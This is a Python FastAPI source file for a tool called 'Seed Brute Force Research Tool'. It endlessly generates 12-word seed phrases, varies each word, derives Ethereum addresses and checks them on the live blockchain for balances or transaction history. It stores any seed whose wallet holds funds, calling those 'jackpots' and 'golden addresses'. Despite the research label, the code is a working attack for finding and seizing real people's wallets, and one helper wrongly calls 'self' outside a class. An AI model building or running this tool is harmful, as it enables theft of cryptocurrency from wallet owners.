import asyncio
import os
from contextlib import asynccontextmanager
from datetime import datetime
from typing import List, Dict, Any, Optional
import concurrent.futures
import threading

from fastapi import FastAPI, HTTPException, BackgroundTasks
from pydantic import BaseModel
import uvicorn

from database import db_manager, SeedMatch
from seed_utils import SeedGenerator, BruteForceAttacker

class AttackRequest(BaseModel):
    max_attempts_per_cycle: int = 2048
    detection_method: str = "transactions"  # "balance" or "transactions" - default to transactions to avoid rate limits

class AttackStatus(BaseModel):
    is_running: bool
    current_cycle: int
    total_attempts: int
    matches_found: int
    current_seed: Optional[str] = None

class HealthResponse(BaseModel):
    status: str
    timestamp: str
    database_connected: bool

# Global state for attack management
attack_state = {
    "is_running": False,
    "current_cycle": 0,
    "total_attempts": 0,
    "matches_found": 0,
    "current_seed": None,
    "found_addresses": []
}

# Global lock for thread-safe operations
attack_lock = threading.Lock()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    await db_manager.connect()
    yield
    # Shutdown
    await db_manager.disconnect()

app = FastAPI(
    title="Seed Brute Force Research Tool",
    description="FastAPI application for testing partial seed brute-force attacks in a controlled security research environment",
    version="1.0.0",
    lifespan=lifespan
)

def process_position_thread(position: int, words: list, seed_gen: SeedGenerator, detection_method: str, 
                          attack_state: dict, original_word: str, results_queue, progress_callback=None):
    """Process a single word position in a separate thread"""
    position_attempts = 0
    position_matches = []
    
    try:
        # Replace this word with each word from wordlist
        for word_idx, candidate_word in enumerate(seed_gen.wordlist):
            if not attack_state["is_running"]:
                break
            
            # Create a copy of words for this thread
            test_words = words.copy()
            test_words[position] = candidate_word
            test_seed = " ".join(test_words)
            position_attempts += 1
            
            # Update global attempts counter (thread-safe)
            with attack_lock:
                attack_state["total_attempts"] += 1
            
            # Validate seed phrase
            if seed_gen.validate_seed(test_seed):
                try:
                    # Generate wallet address from seed
                    wallet_address = seed_gen.seed_to_address(test_seed)
                    
                    # Use selected detection method
                    has_activity = False
                    activity_value = 0
                    
                    if detection_method == "balance":
                        has_activity = seed_gen.has_balance(wallet_address)
                        if has_activity:
                            activity_value = seed_gen.get_balance(wallet_address)
                    else:  # transaction count method
                        has_activity = seed_gen.has_transaction_history(wallet_address)
                        if has_activity:
                            activity_value = seed_gen.get_transaction_count(wallet_address)
                    
                    if has_activity:
                        match_info = {
                            "position": position + 1,
                            "original_word": original_word,
                            "candidate_word": candidate_word,
                            "seed": test_seed,
                            "address": wallet_address,
                            "activity_value": activity_value,
                            "detection_method": detection_method,
                            "attempts": attack_state["total_attempts"]
                        }
                        position_matches.append(match_info)
                        
                except Exception as e:
                    print(f"Error processing seed in position {position + 1}: {e}")
            
            # Progress callback every 50 attempts per position
            if progress_callback and position_attempts % 50 == 0:
                progress_callback(position + 1, position_attempts)
    
    except Exception as e:
        print(f"Error in position {position + 1} thread: {e}")
    
    # Put results in queue
    results_queue.put({
        "position": position,
        "attempts": position_attempts,
        "matches": position_matches
    })

async def run_brute_force_attack(max_attempts_per_cycle: int = 2048, detection_method: str = "balance"):
    """Background task to run the fishing brute force attack - runs forever until stopped"""
    seed_gen = SeedGenerator()
    
    try:
        attack_state["is_running"] = True
        attack_state["current_cycle"] = 0
        attack_state["total_attempts"] = 0
        attack_state["found_addresses"] = []
        
        print(f"Starting infinite fishing brute force attack...")
        print(f"Target: {'Addresses with ETH balance' if detection_method == 'balance' else 'Addresses with transaction history (human-used wallets)'}")
        print(f"Method: Word variation attack - fix 11 words, iterate through 12th word")
        print(f"Checking: {'ETH balance checking' if detection_method == 'balance' else 'Fast transaction count checking'}")
        
        cycle = 0
        while attack_state["is_running"]:  # Run forever until stopped
            cycle += 1
            attack_state["current_cycle"] = cycle
            
            # Generate a random 12-word base seed
            base_seed = seed_gen.generate_random_seed()
            attack_state["current_seed"] = base_seed
            
            # Word variation method: fix 11 words, iterate through 12th
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle {cycle}: Testing variations of: {base_seed}")
            
            words = base_seed.split()
            cycle_attempts = 0
            cycle_valid_seeds = 0
            cycle_addresses_with_activity = 0
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🚀 Starting parallel processing of all 12 positions...")
            
            # Create thread-safe queue for results
            import queue
            results_queue = queue.Queue()
            
            # Progress tracking for each position
            position_progress = {i: 0 for i in range(12)}
            progress_lock = threading.Lock()
            
            def progress_callback(position, attempts):
                with progress_lock:
                    position_progress[position - 1] = attempts
                    total_progress = sum(position_progress.values())
                    if total_progress % 500 == 0:  # Report every 500 attempts across all threads
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🔄 Parallel progress: {total_progress} total attempts across all positions")
            
            # Start position threads in parallel (12 workers - full parallelization with direct blockchain access)
            with concurrent.futures.ThreadPoolExecutor(max_workers=12) as executor:
                futures = []
                
                for position in range(12):
                    if not attack_state["is_running"]:
                        break
                    
                    original_word = words[position]
                    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🧵 Starting thread for position {position + 1} (original word: '{original_word}')")
                    
                    # Submit thread for this position
                    future = executor.submit(
                        process_position_thread,
                        position, words, seed_gen, detection_method,
                        attack_state, original_word, results_queue,
                        progress_callback
                    )
                    futures.append(future)
                
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] ⚡ All 12 position threads started! Processing in parallel with direct blockchain access...")
                
                # Wait for all threads to complete
                concurrent.futures.wait(futures)
                
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] ✅ All position threads completed!")
            
            # Collect results from all threads
            all_matches = []
            total_thread_attempts = 0
            
            while not results_queue.empty():
                result = results_queue.get()
                total_thread_attempts += result["attempts"]
                
                # Process any matches found
                for match in result["matches"]:
                    all_matches.append(match)
                    cycle_addresses_with_activity += 1
                    
                    if detection_method == "balance":
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 💰 ADDRESS WITH BALANCE FOUND!")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Position: {match['position']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Original word: '{match['original_word']}' → Replacement: '{match['candidate_word']}'")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Seed: {match['seed']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Address: {match['address']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Balance: {match['activity_value']} ETH ✅")
                    else:
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 🔄 ADDRESS WITH TRANSACTION HISTORY FOUND!")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Position: {match['position']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Original word: '{match['original_word']}' → Replacement: '{match['candidate_word']}'")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Seed: {match['seed']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Address: {match['address']}")
                        print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Transaction Count: {match['activity_value']} ✅")
                    
                    # Store immediately for important finds
                    try:
                        seed_match = SeedMatch(
                            seed_phrase=match['seed'],
                            address=match['address'],
                            balance=match['activity_value'],
                            timestamp=datetime.utcnow(),
                            attempts_made=match['attempts']
                        )
                        
                        await db_manager.store_successful_match(seed_match)
                        attack_state["matches_found"] += 1
                        attack_state["found_addresses"].append(match['address'])
                    except Exception as e:
                        print(f"Error storing match: {e}")
            
            cycle_attempts = total_thread_attempts
            
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle {cycle} completed: {cycle_attempts} attempts, {attack_state['matches_found']} total matches found")
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Cycle stats: {cycle_valid_seeds} valid seeds, {cycle_addresses_with_activity} addresses with activity")
            print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] Total attempts so far: {attack_state['total_attempts']}")
            
            # Store cycle statistics in database
            try:
                cycle_data = {
                    "cycle_number": cycle,
                    "base_seed": base_seed,
                    "total_attempts": cycle_attempts,
                    "valid_seeds": cycle_valid_seeds,
                    "addresses_with_activity": cycle_addresses_with_activity,
                    "timestamp": datetime.utcnow(),
                    "session_total_attempts": attack_state["total_attempts"]
                }
                await db_manager.store_cycle_stats(cycle_data)
                print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] 📊 Cycle {cycle} statistics stored in database")
            except Exception as e:
                print(f"⚠️ Error storing cycle stats: {e}")
            
            # Small delay between cycles to prevent overwhelming the system
            await asyncio.sleep(0.5)
        
        print(f"Attack stopped by user. Total attempts: {attack_state['total_attempts']}, Matches found: {attack_state['matches_found']}")
        
    except Exception as e:
        print(f"Error during brute force attack: {e}")
    finally:
        attack_state["is_running"] = False

@app.get("/health", response_model=HealthResponse)
async def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        await db_manager.client.admin.command('ping')
        db_connected = True
    except:
        db_connected = False
    
    return HealthResponse(
        status="healthy" if db_connected else "degraded",
        timestamp=datetime.utcnow().isoformat(),
        database_connected=db_connected
    )

@app.post("/attack/start")
async def start_attack(request: AttackRequest, background_tasks: BackgroundTasks):
    """Start a fishing brute force attack"""
    if attack_state["is_running"]:
        raise HTTPException(status_code=400, detail="Attack already running")
    
    # Start the attack in background
    background_tasks.add_task(
        run_brute_force_attack,
        request.max_attempts_per_cycle,
        request.detection_method
    )
    
    return {
        "message": "Infinite fishing brute force attack started",
        "description": f"Will run forever generating random seeds and testing variations for {'addresses with balance' if request.detection_method == 'balance' else 'human-used addresses'}",
        "max_attempts_per_cycle": request.max_attempts_per_cycle,
        "detection_method": request.detection_method,
        "target": "Addresses with ETH balance" if request.detection_method == "balance" else "Addresses with transaction history (human-used wallets)",
        "method": "Word variation - fix 11 words, iterate through remaining word positions",
        "checking": f"{'ETH balance checking' if request.detection_method == 'balance' else 'Fast transaction count checking'} - only stores addresses with activity",
        "note": "Attack will run indefinitely until manually stopped via /attack/stop"
    }

@app.post("/attack/stop")
async def stop_attack():
    """Stop the current attack"""
    if not attack_state["is_running"]:
        raise HTTPException(status_code=400, detail="No attack currently running")
    
    attack_state["is_running"] = False
    return {"message": "Attack stopped"}

@app.get("/attack/status", response_model=AttackStatus)
async def get_attack_status():
    """Get current attack status"""
    return AttackStatus(
        is_running=attack_state["is_running"],
        current_cycle=attack_state["current_cycle"],
        total_attempts=attack_state["total_attempts"],
        matches_found=attack_state["matches_found"],
        current_seed=attack_state["current_seed"]
    )

@app.get("/matches")
async def get_all_matches():
    """Get all successful matches from database (legacy endpoint)"""
    try:
        matches = await db_manager.get_all_matches()
        return {
            "total_matches": len(matches),
            "matches": matches,
            "note": "This shows legacy data. Use /matches/balanced or /matches/zero-balance for separated data"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {str(e)}")

@app.get("/matches/balanced")
async def get_balanced_addresses():
    """Get only addresses with balance > 0 - THE JACKPOTS! 💰"""
    try:
        balanced_addresses = await db_manager.get_balanced_addresses()
        return {
            "total_balanced": len(balanced_addresses),
            "addresses": balanced_addresses,
            "note": "These are the golden addresses with actual cryptocurrency balance!"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {str(e)}")

@app.get("/matches/zero-balance")
async def get_zero_balance_addresses(limit: int = 100):
    """Get addresses with zero balance (limited for performance)"""
    try:
        zero_addresses = await db_manager.get_zero_balance_addresses(limit)
        return {
            "total_shown": len(zero_addresses),
            "limit": limit,
            "addresses": zero_addresses,
            "note": f"Showing latest {limit} zero-balance addresses. These are valid addresses but empty."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {str(e)}")

@app.get("/matches/{address}")
async def get_match_by_address(address: str):
    """Get match information for a specific address"""
    try:
        match = await db_manager.get_match_by_address(address)
        if not match:
            raise HTTPException(status_code=404, detail="No match found for this address")
        return match
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {str(e)}")

@app.get("/stats")
async def get_statistics():
    """Get comprehensive statistics including balanced vs zero balance breakdown"""
    try:
        # Get new separated statistics
        balance_stats = await db_manager.get_balance_statistics()
        
        # Get recent cycle statistics
        recent_cycles = await db_manager.get_recent_cycles(5)
        
        # Legacy total count
        total_matches = await db_manager.get_match_count()
        
        return {
            "attack_status": {
                "current_attack_running": attack_state["is_running"],
                "total_attempts_current_session": attack_state["total_attempts"],
                "current_cycle": attack_state["current_cycle"],
                "matches_found_this_session": attack_state["matches_found"]
            },
            "database_stats": balance_stats,
            "recent_cycles": recent_cycles,
            "legacy_total_matches": total_matches,
            "note": "balanced_addresses are the valuable finds! 💰"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {str(e)}")

@app.get("/cycles")
async def get_cycle_statistics(limit: int = 20):
    """Get cycle completion statistics"""
    try:
        cycles = await db_manager.get_recent_cycles(limit)
        return {
            "total_cycles": len(cycles),
            "cycles": cycles,
            "note": "Statistics updated after each cycle completion"
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Database error: {str(e)}")

@app.post("/utils/generate-seed")
async def generate_random_seed():
    """Generate a random 12-word seed phrase for testing"""
    seed_gen = SeedGenerator()
    seed = seed_gen.generate_random_seed()
    address = seed_gen.seed_to_address(seed)
    
    return {
        "seed_phrase": seed,
        "ethereum_address": address,
        "note": "This is for testing purposes only"
    }

@app.post("/attack/test-with-known-seed")
async def test_with_known_seed(background_tasks: BackgroundTasks):
    """Test the attack with a known working seed by modifying one word"""
    if attack_state["is_running"]:
        raise HTTPException(status_code=400, detail="Attack already running")
    
    # Your sample seed
    known_seed = "news client exhibit balcony network rebuild other smart tomorrow episode panda advice"
    
    seed_gen = SeedGenerator()
    
    # Verify the known seed is valid and get its address
    if not seed_gen.validate_seed(known_seed):
        raise HTTPException(status_code=400, detail="Known seed is not valid")
    
    original_address = seed_gen.seed_to_address(known_seed)
    original_tx_count = seed_gen.get_transaction_count(original_address)
    
    print(f"Original seed: {known_seed}")
    print(f"Original address: {original_address}")
    print(f"Original transaction count: {original_tx_count}")
    
    # Create test scenario: Replace first word with wrong word
    words = known_seed.split()
    words[0] = "abandon"  # Replace 'news' with 'abandon'
    modified_seed = " ".join(words)
    
    print(f"Modified seed for test: {modified_seed}")
    print(f"Will try to recover original seed by testing position 1...")
    
    # Start a custom test attack that will find the original seed
    background_tasks.add_task(
        run_test_attack_with_known_seed,
        original_address,
        modified_seed,
        known_seed
    )
    
    return {
        "message": "Test attack started with known seed",
        "original_seed": known_seed,
        "original_address": original_address,
        "original_tx_count": original_tx_count,
        "modified_seed": modified_seed,
        "description": "Attack will try to recover 'news' by testing all words in position 1"
    }

async def run_test_attack_with_known_seed(target_address: str, modified_seed: str, original_seed: str):
    """Test attack function that should find the known seed"""
    seed_gen = SeedGenerator()
    
    try:
        attack_state["is_running"] = True
        attack_state["current_cycle"] = 1
        attack_state["total_attempts"] = 0
        
        print(f"🧪 Starting test attack to recover: {original_seed}")
        print(f"🎯 Target address: {target_address}")
        print(f"🔍 Testing modified seed: {modified_seed}")
        
        words = modified_seed.split()
        
        # Test position 1 (where we changed 'news' to 'abandon')
        position = 0
        original_word = words[position]  # 'abandon'
        
        print(f"Testing position {position + 1} (current word: '{original_word}')")
        
        for word_idx, candidate_word in enumerate(seed_gen.wordlist):
            if not attack_state["is_running"]:
                break
                
            words[position] = candidate_word
            test_seed = " ".join(words)
            attack_state["total_attempts"] += 1
            
            if seed_gen.validate_seed(test_seed):
                try:
                    # Generate wallet address from seed
                    wallet_address = seed_gen.seed_to_address(test_seed)
                    
                    # Check if this matches our target
                    if wallet_address.lower() == target_address.lower():
                        # SUCCESS! Found the original seed
                        tx_count = seed_gen.get_transaction_count(wallet_address)
                        
                        print(f"🎉 SUCCESS: Recovered original seed!")
                        print(f"Attempts: {attack_state['total_attempts']}")
                        print(f"Found word: '{candidate_word}' (should be 'news')")
                        print(f"Recovered seed: {test_seed}")
                        print(f"Address: {wallet_address}")
                        print(f"Transaction count: {tx_count}")
                        
                        # Store the successful recovery
                        try:
                            seed_match = SeedMatch(
                                seed_phrase=test_seed,
                                address=wallet_address,
                                balance=float(tx_count),
                                timestamp=datetime.utcnow(),
                                attempts_made=attack_state["total_attempts"]
                            )
                            
                            await db_manager.store_successful_match(seed_match)
                            attack_state["matches_found"] += 1
                            print(f"✅ Successfully stored in database!")
                        except Exception as db_error:
                            print(f"⚠️ Database storage failed: {db_error}")
                            print(f"But attack was successful - seed was recovered!")
                        
                        print(f"✅ Test completed successfully!")
                        attack_state["is_running"] = False
                        return
                        
                except Exception as e:
                    print(f"Error processing seed: {e}")
            
            # Progress indicator
            if attack_state["total_attempts"] % 100 == 0:
                print(f"Progress: {attack_state['total_attempts']} attempts...")
        
        print("Test completed - original seed not found (this shouldn't happen)")
        
    except Exception as e:
        print(f"Error during test attack: {e}")
    finally:
        attack_state["is_running"] = False

@app.post("/utils/seed-to-address")
async def seed_to_address(seed_phrase: str):
    """Convert a seed phrase to Ethereum address"""
    try:
        seed_gen = SeedGenerator()
        if not seed_gen.validate_seed(seed_phrase):
            raise HTTPException(status_code=400, detail="Invalid seed phrase")
        
        address = seed_gen.seed_to_address(seed_phrase)
        return {
            "seed_phrase": seed_phrase,
            "ethereum_address": address
        }
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")

@app.post("/test/check-transaction-history")
async def test_transaction_history():
    """Test endpoint to check transaction history for addresses"""
    try:
        # Test with known active addresses
        test_addresses = [
            "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045",  # Vitalik's address
            "0x742d35Cc6635C0532925a3b8D581d3E9f4f9Ffff",  # Random address
        ]
        
        seed_gen = SeedGenerator()
        results = []
        
        for address in test_addresses:
            has_activity = seed_gen.has_transaction_history(address)
            tx_count = seed_gen.get_transaction_count(address) if has_activity else 0
            
            results.append({
                "address": address,
                "has_transaction_history": has_activity,
                "transaction_count": tx_count,
                "status": "HUMAN-USED ✅" if has_activity else "UNUSED ❌"
            })
        
        return {
            "test_results": results,
            "note": "This tests the transaction history checking logic used by the attack"
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error testing transaction history: {str(e)}")

class TransactionTestRequest(BaseModel):
    address: str

@app.post("/test/check-address-history")
async def test_specific_address_history(request: TransactionTestRequest):
    """Simple test: Give address, return if transaction count > 0"""
    try:
        address = request.address.strip()
        seed_gen = SeedGenerator()
        
        tx_count = seed_gen.get_transaction_count(address)
        has_transactions = tx_count > 0
        
        return {
            "address": address,
            "transaction_count": tx_count,
            "count_greater_than_zero": has_transactions,
            "result": "PASS" if has_transactions else "SKIP"
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")

@app.post("/test/compare-balance-vs-txcount")
async def compare_balance_vs_transaction_methods(request: TransactionTestRequest):
    """Compare ETH balance check vs transaction count check for the same address"""
    try:
        address = request.address.strip()
        seed_gen = SeedGenerator()
        
        import time
        
        # Test transaction count method (current fast method)
        start_time = time.time()
        tx_count = seed_gen.get_transaction_count(address)
        has_transactions = tx_count > 0
        tx_method_time = time.time() - start_time
        
        # Test balance method
        start_time = time.time()
        balance = seed_gen.get_balance(address)
        has_balance = balance > 0
        balance_method_time = time.time() - start_time
        
        # Determine which method would be more useful
        both_methods_agree = has_transactions == has_balance
        
        return {
            "address": address,
            "transaction_method": {
                "transaction_count": tx_count,
                "has_activity": has_transactions,
                "response_time_ms": round(tx_method_time * 1000, 2),
                "result": "ACTIVE" if has_transactions else "INACTIVE"
            },
            "balance_method": {
                "balance_eth": balance,
                "has_balance": has_balance,
                "response_time_ms": round(balance_method_time * 1000, 2),
                "result": "HAS_FUNDS" if has_balance else "NO_FUNDS"
            },
            "comparison": {
                "methods_agree": both_methods_agree,
                "tx_method_faster": tx_method_time < balance_method_time,
                "speed_difference_ms": round(abs(balance_method_time - tx_method_time) * 1000, 2),
                "recommendation": self._get_method_recommendation(has_transactions, has_balance, tx_method_time, balance_method_time)
            }
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")

def _get_method_recommendation(has_tx: bool, has_balance: bool, tx_time: float, balance_time: float) -> str:
    """Get recommendation for which method to use based on results"""
    if has_tx and has_balance:
        return "Both methods found activity - use faster tx_count method"
    elif has_tx and not has_balance:
        return "Address used but empty - tx_count method better for finding 'used' addresses"
    elif not has_tx and has_balance:
        return "Address has funds but no outgoing tx - balance method better for finding 'funded' addresses"
    else:
        faster_method = "tx_count" if tx_time < balance_time else "balance"
        return f"Address inactive - both methods agree, use faster {faster_method} method"

@app.post("/test/benchmark-detection-methods")
async def benchmark_detection_methods():
    """Benchmark both detection methods against known addresses"""
    try:
        # Test addresses with different characteristics (valid checksums)
        test_addresses = [
            {
                "name": "Vitalik's Address (high activity)",
                "address": "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
            },
            {
                "name": "Uniswap V2 Router (contract)",
                "address": "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"
            },
            {
                "name": "Binance Hot Wallet (exchange)",
                "address": "0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE"
            }
        ]
        
        seed_gen = SeedGenerator()
        results = []
        
        import time
        
        for addr_info in test_addresses:
            address = addr_info["address"]
            
            # Test transaction count method
            start_time = time.time()
            tx_count = seed_gen.get_transaction_count(address)
            has_transactions = tx_count > 0
            tx_method_time = time.time() - start_time
            
            # Test balance method  
            start_time = time.time()
            balance = seed_gen.get_balance(address)
            has_balance = balance > 0
            balance_method_time = time.time() - start_time
            
            results.append({
                "name": addr_info["name"],
                "address": address,
                "transaction_method": {
                    "count": tx_count,
                    "has_activity": has_transactions,
                    "time_ms": round(tx_method_time * 1000, 2)
                },
                "balance_method": {
                    "balance_eth": balance,
                    "has_balance": has_balance,
                    "time_ms": round(balance_method_time * 1000, 2)
                },
                "speed_difference": {
                    "tx_faster": tx_method_time < balance_method_time,
                    "difference_ms": round(abs(balance_method_time - tx_method_time) * 1000, 2)
                }
            })
        
        # Calculate averages
        avg_tx_time = sum(r["transaction_method"]["time_ms"] for r in results) / len(results)
        avg_balance_time = sum(r["balance_method"]["time_ms"] for r in results) / len(results)
        
        return {
            "benchmark_results": results,
            "summary": {
                "avg_transaction_method_ms": round(avg_tx_time, 2),
                "avg_balance_method_ms": round(avg_balance_time, 2),
                "transaction_method_faster_overall": avg_tx_time < avg_balance_time,
                "speed_advantage_ms": round(abs(avg_balance_time - avg_tx_time), 2),
                "recommendation": "Transaction count method is generally faster" if avg_tx_time < avg_balance_time else "Balance method is generally faster"
            },
            "note": "This benchmark shows the performance difference between the two detection methods"
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Benchmark error: {str(e)}")

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=port,
        reload=False,  # Disable reload in production
        log_level="info"
    )